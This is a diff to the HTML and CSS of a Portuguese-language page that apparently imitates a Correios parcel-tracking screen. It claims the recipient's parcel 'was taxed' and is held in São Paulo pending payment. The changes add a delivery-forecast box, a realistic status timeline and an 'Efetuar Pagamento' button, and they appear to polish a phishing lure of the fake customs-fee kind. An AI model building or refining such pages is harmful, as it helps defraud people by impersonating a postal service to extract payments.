@@ -266,7 +266,7 @@
       font-weight: bold;
       font-size: 18px;
       margin-bottom: 15px;
-      text-align: left;
+      text-align: center;
       font-family: 'Futura No. 2', sans-serif;
       font-variant: small-caps;
       letter-spacing: 0.5px;
@@ -280,26 +280,25 @@
     }
     
     .status-value {
-      color: #D4AF37; /* Amarelo dourado mais intenso */
+      color: #D4AF37;
       font-weight: bold;
-      text-align: center;
+      text-align: left;
       font-size: 16px;
       font-family: 'Futura No. 2', sans-serif;
       font-variant: small-caps;
       position: relative;
-      padding-left: 0;
+      padding-left: 20px;
       margin: 15px 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
     
     .status-value:before {
       content: "•";
-      color: #D4AF37; /* Amarelo dourado mais intenso */
+      color: #D4AF37;
       font-size: 24px;
-      margin-right: 10px;
-      line-height: 1;
+      position: absolute;
+      left: 0;
+      top: 50%;
+      transform: translateY(-50%);
     }
     
     .normal-text {
@@ -394,7 +393,7 @@
     }
     
     .breadcrumb a {
-      color: #003157; /* Azul escuro */
+      color: #003157;
       text-decoration: none;
     }
     
@@ -403,13 +402,13 @@
     }
     
     .breadcrumb .active {
-      color: #003157; /* Azul escuro */
+      color: #003157;
     }
     
     .breadcrumb > li + li:before {
       content: ">";
       padding: 0 5px;
-      color: #003157; /* Azul escuro */
+      color: #003157;
     }
 
     /* Caixa image */
@@ -423,22 +422,77 @@
       height: auto;
     }
     
-    /* Texto azul escuro */
-    .blue-dark-text {
+    /* Delivery forecast */
+    .delivery-forecast {
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: center;
+      border-left: 4px solid #003157;
+    }
+    
+    .delivery-forecast h3 {
       color: #003157;
+      font-weight: bold;
+      margin-bottom: 5px;
     }
     
-    /* Status info */
-    .status-info {
-      text-align: left;
-      margin: 30px 0; /* Espaçamento de 3 linhas */
-      font-size: 14px;
-      color: #333;
-      line-height: 1.5;
+    /* Status timeline */
+    .status-timeline {
+      margin: 30px 0;
     }
     
-    .status-info p {
+    .status-item {
+      margin-bottom: 25px;
+      position: relative;
+      padding-left: 30px;
+    }
+    
+    .status-item:before {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 5px;
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      background: #003157;
+    }
+    
+    .status-item:after {
+      content: "";
+      position: absolute;
+      left: 7px;
+      top: 20px;
+      width: 1px;
+      height: calc(100% - 15px);
+      background: #003157;
+    }
+    
+    .status-item:last-child:after {
+      display: none;
+    }
+    
+    .status-item h4 {
+      color: #003157;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    
+    .status-item p {
       margin: 5px 0;
+      color: #333;
+    }
+    
+    .payment-button-container {
+      text-align: center;
+      margin: 25px 0;
+    }
+    
+    .divider {
+      border-top: 1px solid #ddd;
+      margin: 20px 0;
     }
   </style>
 </head>
@@ -522,26 +576,36 @@
         <li class="active">Rastreamento</li>
       </ul>
       
-      <div class="alert-title">❗ SUA ENCOMENDA FOI TRIBUTADA!</div>
+      <div class="alert-title">SUA ENCOMENDA FOI TRIBUTADA!</div>
       
-      <div class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</div>
+      <div class="delivery-forecast">
+        <h3>Previsão de Entrega</h3>
+        <p>3 dias após o pagamento</p>
+      </div>
       
-      <p class="blue-dark-text">Sua encomenda está retida na agência dos Correios em São Paulo</p>
-      
-      <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
-      
-      <div class="caixa-image">
-        <img src="images/Caixa.png" alt="Caixa">
+      <div class="status-timeline">
+        <div class="status-item">
+          <h4>Objeto aguardando sua confirmação</h4>
+          <p>em Unidade de Fiscalização em São Paulo</p>
+          <div class="payment-button-container">
+            <button id="btn-pagar">Efetuar Pagamento</button>
+          </div>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <div class="status-item">
+          <h4>Objeto em transferência - por favor aguarde</h4>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <div class="status-item">
+          <h4>Objeto Postado</h4>
+        </div>
       </div>
       
       <div class="btn-container">
-        <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
-        <div class="status-info">
-          <p>Objeto aguardando sua confirmação</p>
-          <p>em Unidade de Fiscalização em São Paulo</p>
-          <p>Objeto em transferência - por favor aguarde</p>
-          <p>Objeto Postado</p>
-        </div>
         <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
       </div>
     </section>
